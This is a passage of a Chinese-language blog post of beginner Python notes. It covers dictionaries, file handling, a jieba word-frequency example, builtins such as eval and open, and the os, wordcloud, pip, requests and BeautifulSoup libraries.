<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205175315482.png" style="zoom:67%;" loading="lazy">

<blockquote>
<p>sorted()：对列表进行排序（小到大）</p>
</blockquote>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>使用<code>&#123;&#125;</code>和<code>dict&#123;&#125;</code>给变量赋值创建，键值对之间用<code>:</code>分隔，d[key]可以进行索引也可用于赋值，但在进行赋值的时候只能啊<code>a[1] = a[2]</code>这样赋值，不能<code>1 = a[1]</code>、a[i]代表的是i这个键对应的值，无法直接修改值的键，如果要对键操作需要将这个键删除（即<code>(del a[i])</code>），然后再将这个值赋给一个新的键。</p>
<p><code>update()</code>方法，在字典中添加键值对，也可以直接赋值添加</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200216101507795.png" alt loading="lazy"></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205184557293.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205184654602.png" style="zoom:67%;" loading="lazy">

<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200207164533879.png" style="zoom:67%;" loading="lazy">

<p>文件读取方法：<code>read()</code>,<code>readline()</code>,<code>readlines()</code>,在入方法：<code>write()</code>,<code>writelines()</code></p>
<p>二维数据的处理：<code>for</code>循环+<code>.split()</code>和<code>.join()</code></p>
<p>三国演义人物出场词频统计</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jieba
txt <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"三国演义.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
words <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>txt<span class="token punctuation">)</span>  <span class="token comment">#lcut精确模式，返回一列表类型</span>
counts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        counts<span class="token punctuation">[</span>word<span class="token punctuation">]</span> <span class="token operator">=</span> counts<span class="token punctuation">.</span>get<span class="token punctuation">(</span>word<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#字典类型中'='为创造一个键值对，亦可进行赋值操作</span>
items <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>counts<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#items方法为返回字典中所有的键值对信息</span>
items<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    word<span class="token punctuation">,</span>count <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0:&lt;10&#125;&#123;1:>5&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>word<span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h2><p>生成器<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856/">参考</a></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193657638.png" style="zoom:67%;" loading="lazy">

<h2 id="is"><a href="#is" class="headerlink" title="is"></a>is</h2><p>在Pytohn中，进行数值比较时会用到 <code>==</code> 运算符，判断两个变量的地址是否相同用 <code>is</code> 关键字</p>
<p>如下列比较操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200406163737563.png" alt loading="lazy"></p>
<h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h2><p>Python pass 是空语句，是为了保持程序结构的完整性。</p>
<p><strong>pass</strong> 不做任何事情，一般用做占位语句。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sample</span><span class="token punctuation">(</span>n_samples<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code></pre>

<p>该处的 pass 便是占据一个位置，因为如果定义一个空函数程序会报错，当你没有想好函数的内容是可以用 pass 填充，使程序可以正常运行。</p>
<h2 id="u-r-b-f"><a href="#u-r-b-f" class="headerlink" title="u,r,b,f"></a>u,r,b,f</h2><p>在字符串前面为了能够更好的识别字符串处理方式，于是在字符串前面加上这些标识符来识别</p>
<ul>
<li>u：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li>
<li>r：去掉反斜杠的转义机制。常用于re模块</li>
<li>b：后面字符串是bytes 类型。在网络编程中，服务器和浏览器只认bytes 类型数据。</li>
<li>f：字符串内支持大括号内的python 表达式</li>
</ul>
<h2 id="和"><a href="#和" class="headerlink" title="*和**"></a><code>*</code>和<code>**</code></h2><p>这两种用法可以将<strong>任意个数</strong>的参数导入到python函数中</p>
<p>单星号<code>（*）</code>：<code>*agrs</code> 将所有参数以<strong>元组(tuple)</strong>的形式导入，如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span><span class="token operator">*</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>
a<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>
b<span class="token punctuation">(</span><span class="token operator">*</span>k<span class="token punctuation">)</span>   <span class="token comment">#解压参数列表</span></code></pre>

<p>输出：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token number">1</span>
<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token number">2</span></code></pre>

<p>双星号<code>（**）</code>：<code>**kwargs</code> 将参数以<strong>字典</strong>的形式导入，如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span><span class="token operator">**</span>str2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
a<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre>

<p>输出：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token number">1</span>
<span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span></code></pre>

<h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>评估函数</p>
<p>用法：去掉参数最外侧引号并执行余下语句的函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200201103455433.png" alt loading="lazy"></p>
<h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>格式化函数</p>
<p>基本语法是通过{}和:来代替以前的%，<a href="https://www.runoob.com/python/att-string-format.html">详</a></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200202141611146.png" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200202171711002.png" style="zoom: 40%;" loading="lazy">

<h2 id="id"><a href="#id" class="headerlink" title="id()"></a>id()</h2><p><strong>id()</strong> 函数返回对象的唯一标识符，标识符是一个整数。</p>
<p>CPython 中 <strong>id()</strong> 函数用于获取对象的内存地址。</p>
<p>语法：<code>id([object])</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200406162510638.png" alt loading="lazy"></p>
<h2 id="type"><a href="#type" class="headerlink" title="type()"></a>type()</h2><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200215100705983.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200406163544027.png" alt loading="lazy"></p>
<h2 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h2><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200215145928773.png" alt loading="lazy"></p>
<h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p><a href="https://www.runoob.com/python/file-methods.html">参考</a></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200216104144396.png" style="zoom:80%;" loading="lazy">

<h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/image-20200415104107118.png" alt loading="lazy"></p>
<h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><p><a href="https://www.jianshu.com/p/6c33bd958f3d">参考</a></p>
<p>mode 参数有：</p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">t</td>
<td align="center">文本模式 (默认)。</td>
</tr>
<tr>
<td align="center">x</td>
<td align="center">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">二进制模式。</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">打开一个文件进行更新(可读可写)。</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">通用换行模式（不推荐）。</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td>
</tr>
<tr>
<td align="center">rb</td>
<td align="center">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="center">打开一个文件用于读写。文件指针将会放在文件的开头。</td>
</tr>
<tr>
<td align="center">rb+</td>
<td align="center">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="center">w</td>
<td align="center">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="center">wb</td>
<td align="center">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="center">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td>
</tr>
<tr>
<td align="center">wb+</td>
<td align="center">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="center">ab</td>
<td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td>
</tr>
<tr>
<td align="center">a+</td>
<td align="center">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td>
</tr>
<tr>
<td align="center">ab+</td>
<td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td>
</tr>
</tbody></table>
<p>默认为文本模式，如果要以二进制模式打开，加上 <code>b</code> 。</p>
<p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">方法及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center"><a href="https://www.runoob.com/python/file-close.html"><code>file.close()</code></a>关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center"><a href="https://www.runoob.com/python/file-flush.html"><code>file.flush()</code></a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center"><a href="https://www.runoob.com/python/file-fileno.html"><code>file.fileno()</code></a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center"><a href="https://www.runoob.com/python/file-isatty.html"><code>file.isatty()</code></a>如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center"><a href="https://www.runoob.com/python/file-next.html"><code>file.next()</code></a>返回文件下一行。</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center"><a href="https://www.runoob.com/python/python-file-read.html"><code>file.read([size])</code></a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center"><a href="https://www.runoob.com/python/file-readline.html"><code>file.readline([size])</code></a>读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center"><a href="https://www.runoob.com/python/file-readlines.html"><code>file.readlines([sizeint])</code></a>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center"><a href="https://www.runoob.com/python/file-seek.html"><code>file.seek(offset[, whence])</code></a>设置文件当前位置</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center"><a href="https://www.runoob.com/python/file-tell.html"><code>file.tell()</code></a>返回文件当前位置。</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center"><a href="https://www.runoob.com/python/file-truncate.html"><code>file.truncate([size])</code></a>截取文件，截取的字节通过size指定，默认为当前文件位置。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center"><a href="https://www.runoob.com/python/python-file-write.html"><code>file.write(str)</code></a>将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center"><a href="https://www.runoob.com/python/file-writelines.html"><code>file.writelines(sequence)</code></a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody></table>
<h1 id="一些库"><a href="#一些库" class="headerlink" title="一些库"></a>一些库</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="OS库路径操作"><a href="#OS库路径操作" class="headerlink" title="OS库路径操作"></a>OS库路径操作</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210121104519.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210121210427.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210121239874.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210121259753.png" style="zoom:67%;" loading="lazy">

<p>os.path.getsize(path)：返回path对应文件的大小，以字节为单位&gt;&gt;&gt;os.path.getsize(“c:/1.txt”)   ——&gt;   123</p>
<h3 id="OS库进程管理"><a href="#OS库进程管理" class="headerlink" title="OS库进程管理"></a>OS库进程管理</h3><p>os.system(command)———–执行程序或命令command，在Windows中返回值为cmd的调用返回信息</p>
<h3 id="OS库环境参数"><a href="#OS库环境参数" class="headerlink" title="OS库环境参数"></a>OS库环境参数</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210122033256.png" style="zoom:67%;" loading="lazy">

<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">os.getlogin()</td>
<td align="center">获得当前系统登录用户名称</td>
</tr>
<tr>
<td align="center">os.cpu_count()</td>
<td align="center">获得当前系统的CPU数量</td>
</tr>
</tbody></table>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200210133215349.png" style="zoom:67%;" loading="lazy">

<h2 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h2><p>配置对象参数—&gt;加载词云文本—&gt;输出词云文件</p>
<blockquote>
<p>分隔：以空格分隔单词</p>
<p>统计：单词出现次数并过滤</p>
<p>字体：根据统计配置字号</p>
<p>布局：颜色环境尺寸</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">w.generate(txt)</td>
<td align="center">向WordCloud对象w中加载文本txt &gt;&gt;&gt;<code>w.generate(&quot;Python and WordCloud&quot;)</code></td>
</tr>
<tr>
<td align="center">w.to_file(filename)</td>
<td align="center">将词云输出为图像文件，<code>.png</code>或<code>.jpg</code>格式 &gt;&gt;&gt;<code>w.to_file(&quot;outfile.png&quot;)</code></td>
</tr>
</tbody></table>
<p>w.wordcloud.WordCloud()参数：</p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">min_font_size</td>
<td align="center">指定词云中字体的最小字体，默认4 &gt;&gt;&gt;w=wordcloud.WordCloud(min_font_size=10)</td>
</tr>
<tr>
<td align="center">max_font_size</td>
<td align="center">指定词云中字体的最大字号，根据高度自动调节  &gt;&gt;&gt;w=wordcloud.WordCloud(max_font_size=20)</td>
</tr>
<tr>
<td align="center">font_step</td>
<td align="center">指定词云中字体字号的步进间隔，默认为1 &gt;&gt;&gt;w=wordcloud.WordCloud(font_step=2)</td>
</tr>
<tr>
<td align="center">width</td>
<td align="center">指定词云对象生成图片的宽度，默认400像素 &gt;&gt;&gt; w= wordcloud.WordCloud(width=600)</td>
</tr>
<tr>
<td align="center">height</td>
<td align="center">指定词云对象生成图片的高度，默认200像素 &gt;&gt;&gt;w= wordcloud.WordCloud(width=400)</td>
</tr>
<tr>
<td align="center">font_path</td>
<td align="center">指定字体文件的路径，默认None &gt;&gt;&gt; w=wordcloud.WordCloud(font_path=”msyh.ttc”)</td>
</tr>
<tr>
<td align="center">max-words</td>
<td align="center">指定词云显示的最大单词数量，默认200 &gt;&gt;&gt; w= wordcloud.WordCloud(max_words=20)</td>
</tr>
<tr>
<td align="center">stop_word</td>
<td align="center">指定词云的排除列表，即不显示单词列表&gt;&gt;&gt; w= wordcloud.WordCloud(stop_words={“Python”})</td>
</tr>
<tr>
<td align="center">mask</td>
<td align="center">指定词云形状，默认为长方形，需要引用imread()函数&gt;&gt;&gt;from scipy.misc import imread &gt;&gt;&gt; mk = imread(“pic.png”) &gt;&gt;&gt; w = wordcloud.WordCloud(mask=mk)</td>
</tr>
<tr>
<td align="center">background_color</td>
<td align="center">指定词云图片的背景颜色，默认为红黑色 &gt;&gt;&gt; w= wordcloud.WordCloud(background_color=”white”)</td>
</tr>
</tbody></table>
<h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>打包.py文件为.exe应用程序</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205161232599.png" style="zoom:67%;" loading="lazy">

<h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><table>
<thead>
<tr>
<th align="center">使用方法</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pip install &lt;第三方库名&gt;</td>
<td align="center">安装第三方库</td>
</tr>
<tr>
<td align="center">pip install -U &lt;第三方库名&gt;</td>
<td align="center">更新第三方库</td>
</tr>
<tr>
<td align="center">pip uninstall &lt;第三方库名&gt;</td>
<td align="center">卸载第三方库</td>
</tr>
<tr>
<td align="center">pip download &lt;第三方库名&gt;</td>
<td align="center">下载但不安装指定的第三方库</td>
</tr>
<tr>
<td align="center">pip show &lt;第三方库名&gt;</td>
<td align="center">列出某个指定第三方库的详细信息</td>
</tr>
<tr>
<td align="center">pip search &lt;关键字&gt;</td>
<td align="center">根据关键词在名称和介绍中搜索第三方库</td>
</tr>
<tr>
<td align="center">pip list</td>
<td align="center">列出当前系统的python版本已经安装的第三方库</td>
</tr>
</tbody></table>
<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h3><table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">requests.requset(method,url,**kwargs)</td>
<td align="center">构造一个请求，支撑以下各方法的基础方法</td>
</tr>
<tr>
<td align="center">requests.get(url,params=None,**kwargs)</td>
<td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td>
</tr>
<tr>
<td align="center">requests.head(url,**kwargs)</td>
<td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td>
</tr>
<tr>
<td align="center">requests.post(url,data=None,json=None,**kwargs)</td>
<td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td>
</tr>
<tr>
<td align="center">requests.put(url,data=None,**kwargs)</td>
<td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td>
</tr>
<tr>
<td align="center">requests.patch(url,data=None,**kwargs)</td>
<td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td>
</tr>
<tr>
<td align="center">requests.delete(url,**kwargs)</td>
<td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td>
</tr>
</tbody></table>
<p>method：</p>
<blockquote>
<p>请求方式，GET,HEAD,POST,PUT,PATCH,DALETE,OPTIONS</p>
</blockquote>
<p>**kwargs：</p>
<p>控制访问的参数，均为可选项</p>
<blockquote>
<p>params：字典或字节序列，作为参数增加到url中</p>
<p>data：字典、字节序列或文件对象，作为Request的内容</p>
<p>json：JSON格式的数据，作为Request的内容</p>
<p>headers：字典，HTTP定制头</p>
<p>cookies：字典或CookieJar，Request中的cookie</p>
<p>auth：元祖，支持HTTP认证功能</p>
<p>files：字典类型，传输文件</p>
<p>timeout：设定超时时间，秒为单位</p>
<p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p>
<p>allow_redirects：True/False，默认为True，重定向开关</p>
<p>stream：True/False，默认为True，获取内容立即下载开关</p>
<p>verify：True/False，默认为True，认证SSL证书开关</p>
<p>cert：本地SSL证书路径</p>
</blockquote>
<h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table>
<thead>
<tr>
<th align="center">异常</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">requests.ConnectionError</td>
<td align="center">网络连接错误异常，如DNS查询失败，拒绝连接等</td>
</tr>
<tr>
<td align="center">requests.HTTPError</td>
<td align="center">HTTP错误异常</td>
</tr>
<tr>
<td align="center">requests.URLRequired</td>
<td align="center">url缺失异常</td>
</tr>
<tr>
<td align="center">requests.TooManyRedirects</td>
<td align="center">超过最大重定向次数，产生重定向异常</td>
</tr>
<tr>
<td align="center">requests.ConnectTimeout</td>
<td align="center">连接远程服务器超时异常</td>
</tr>
<tr>
<td align="center">requests.Timeout</td>
<td align="center">请求URL超时，产生超时异常</td>
</tr>
</tbody></table>
<h3 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h3><table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r.status_code</td>
<td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td>
</tr>
<tr>
<td align="center">r.text</td>
<td align="center">HTTP响应内容的字符串形式，即，url对应的页面内容</td>
</tr>
<tr>
<td align="center">r.encoding</td>
<td align="center">从HTTP header中猜测的响应内容编码方式</td>
</tr>
<tr>
<td align="center">r.apparent_encoding</td>
<td align="center">从内容中分析出响应内容编码的方式（备选编码方式）</td>
</tr>
<tr>
<td align="center">r.content</td>
<td align="center">HTTP响应内容的二进制形式</td>
</tr>
</tbody></table>
<h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>也叫beautifulsoup4或bs4</p>
<h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215095808822.png" style="zoom:50%;" loading="lazy">

<h3 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215102120777.png" style="zoom:33%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215101930283.png" style="zoom: 50%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215102442134.png" style="zoom:80%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215102747676.png" style="zoom: 67%;" loading="lazy">

<p>注：平行遍历发生在同一个父节点下的各节点间</p>
<p><code>prettify()</code>格式化输出</p>
<h3 id="内容查找方法"><a href="#内容查找方法" class="headerlink" title="内容查找方法"></a>内容查找方法</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215110510847.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215110603229.png" style="zoom:67%;" loading="lazy">

<h3 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h3><table>
<thead>
<tr>
<th align="center">解析器</th>
<th align="center">使用方法</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center">bs4的HTML解析器</td>
<td align="center">BeautifulSoup(mk,’html.parser’)</td>
<td align="center">安装bs4库</td>
</tr>
<tr>
<td align="center">lxml的HTML解析器</td>
<td align="center">BeautifulSoup(mk,’lxml’)</td>
<td align="center">pip install lxml</td>
</tr>
<tr>
<td align="center">lxml的XML解析器</td>
<td align="center">BeautifulSoup(mk,’xml’)</td>
<td align="center">pip install lxml</td>
</tr>
<tr>
<td align="center">html5lib的解析器</td>
<td align="center">BeautifulSoup(mk,’html5lib’)</td>
<td align="center">pip install html5lib</td>
</tr>
</tbody></table>
